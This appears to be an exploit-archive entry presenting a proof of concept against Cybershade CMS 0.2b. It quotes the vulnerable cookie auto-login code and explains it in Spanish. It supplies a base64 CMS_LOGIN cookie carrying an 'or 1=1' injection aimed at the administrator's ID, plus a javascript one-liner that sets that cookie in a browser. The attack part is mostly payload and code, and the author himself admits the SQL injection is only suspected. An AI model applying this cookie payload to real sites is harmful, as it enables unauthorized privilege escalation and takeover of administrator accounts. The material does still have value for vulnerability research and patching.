@@ -1,0 +1,111 @@
+id: 11086
+date: 02/25/2010
+title: Cybershade CMS 0.2b Session Hijacking PoC Vulnerability
+author: JosS
+cves: 
+
+=======================================================
+Cybershade CMS 0.2b Session Hijacking PoC Vulnerability
+=======================================================
+
+# p0c!: Session Hijacking
+#################################################################################################
+# Cybershade CMS 0.2b Session Hijacking PoC Vulnerability
+# url: http://sourceforge.net/projects/cybershadecms/
+#
+# Author: Jose Luis Gongora Fernandez 'aka' JosS
+# site: http://www.hack0wn.com/
+# team: Spanish Hackers Team - [SHT]
+#
+# Hack0wn Security Project!!
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+#################################################################################################
+#
+#
+# code vuln!: [core/core.php]
+#   line 18: $CMS_ip = htmlspecialchars($_SERVER['REMOTE_ADDR']);
+#             ...
+#   line 27: if (isset($_COOKIE['CMS_LOGIN']) && (!isset($_SESSION['CMS_user']))){
+#                $cookie = base64_decode($_COOKIE['CMS_LOGIN']);
+#                $CMS_COOKIE = explode(':', $cookie);
+#                $c_id = substr($CMS_COOKIE[0], 9);
+#                $c_acode = substr($CMS_COOKIE[1], 0, 6);
+#                $auto_login = sql_query(users, autologin, "WHERE id='".$c_id."'");
+#                $acode = sql_query(users, usercode, "WHERE id='".$c_id."'");
+#                $ip = sql_query(users, userip, "WHERE id='".$c_id."'");
+#   line 35: if (($auto_login == 1) && ($c_acode == $acode) && ($CMS_ip == $ip)){
+#                $_SESSION['CMS_user'] = sql_query(users, username, "WHERE id='".$c_id."'");
+#                $_SESSION['CMS_priv'] = sql_query(users, rights, "WHERE id='".$c_id."'");
+#            }}
+#
+#################################################################################################
+#
+#
+#    Debo decir que en este documento no mostrare la forma exacta
+#  para poder realizar un ataque con exito utilizando este modo.
+#  Ya que como su propio titulo indica es una __Prueba de Concepto__.
+#  La vulnerabilidad nos permite escalar privilegios mediante cookie spoofing.
+#  
+#
+# Analizando el codigo:
+#
+#   Linea 27: Comprueba la existencia de la Cookie "CMS_LOGIN" y que no haya
+#             ninguna sesion ya definida.
+#   Linea 28: Realiza un decode en base64 al valor de la Cookie "CMS_LOGIN"
+#             por lo que esta debera estar encode Base64.
+#   Linea 29: Divide la Cookie en dos partes usando como limitador ":",
+#             colocando cada parte en $CMS_COOKIE[0] y $CMS_COOKIE[1].
+#   Linea 30: Coloca en $c_id el contenido restante a los 9 caracteres
+#             principales de $CMS_COOKIE[0].
+#   Linea 31: Coloca en $c_acode los 6 primeros caracteres de $CMS_COOKIE[1].
+#   Linea 32: Mira si el usuario a comprobado el auto_ingreso.
+#   Linea 33: Obtiene los datos almacenados en "usercode".
+#   Linea 34: Obtiene la IP asignada a dicho usuario.
+#   Linra 35: Hace varias comprobaciones con IF antes de escalar los privilegios.
+#
+# /------------------/
+#
+#    Podriamos basar nuestro ataque en una inyeccion de este tipo:
+#      Inyeccion: basuraaaa1:222222baruraaaaaa
+#
+#    Donde '1' pondriamos el ID del usuario al que queremos escalar privilegos,
+#  en este caso si es el administrador se da por sabadio que es '1'. Lo demas
+#  es basura, condicion puesta con la funcion substr.
+#
+#    Donde '2' tendriamos que introducir una sentencia que nos permitiese
+#  igualar ($c_acode == $acode), como bien indica la sentencia IF de la linea 35.
+#  Talvez buscar la igualdad logica apropiada sea la parte mas dificil del ataque,
+#  pero como estamos trabando un ataque de inyecciones SQL ... or 1=1.
+#
+#    Ejemplo de Inyeccion: basuraaaa1:or 1=1baruraaaaaa
+#
+#    Si todo sale bien, deberiamos escalar los privilegios hacia el usuario que
+#  indicamos en el ID de la inyeccion.
+#
+#
+# Codigo de concepto:
+#
+#  <?PHP
+#    $login="YmFzdXJhYWFhMTpvciAxPTFiYXJ1cmFhYWFhYQ=="; // basuraaaa1:or 1=1baruraaaaaa
+#    $cookie = base64_decode($login);
+#    $CMS_COOKIE = explode(':', $cookie);
+#    $c_id = substr($CMS_COOKIE[0], 9);
+#    $c_acode = substr($CMS_COOKIE[1], 0, 6);
+#
+#    echo "$c_id\n";
+#    echo $c_acode;
+#  ?>
+#################################################################################################
+# Possible SQL injection? I think so
+#################################################################################################
+
+
+p0c!: javascript:document.cookie = "CMS_LOGIN=YmFzdXJhYWFhMTpvciAxPTFiYXJ1cmFhYWFhYQ==; path=/";
+
+
+
+
+#  0day.today [2023-03-27]  #
